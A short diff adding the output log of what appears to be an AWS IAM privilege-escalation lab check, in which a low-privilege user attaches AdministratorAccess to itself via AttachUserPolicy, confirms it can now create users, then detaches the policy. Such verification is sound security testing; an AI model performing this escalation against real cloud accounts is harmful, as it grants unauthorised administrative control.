@@ -1,0 +1,12 @@
+[*] acting as: arn:aws:iam::559292738121:user/pathtriage-low-priv-attacker
+[*] Step 1: baseline probe — can we already do privileged actions?
+    [+] iam:CreateUser denied (as expected for a low-priv user)
+[*] Step 2: attaching arn:aws:iam::aws:policy/AdministratorAccess to pathtriage-low-priv-attacker
+    [+] attached
+[*] Step 3: waiting 12s for IAM propagation
+[*] Step 4: re-probing the privileged action
+    [+] iam:CreateUser now SUCCEEDS — escalation confirmed
+[*] Step 5: cleanup — detaching arn:aws:iam::aws:policy/AdministratorAccess
+    [+] detached; lab restored to starting state
+
+[+] Path 05 verified: low-priv user -> effective admin via AttachUserPolicy
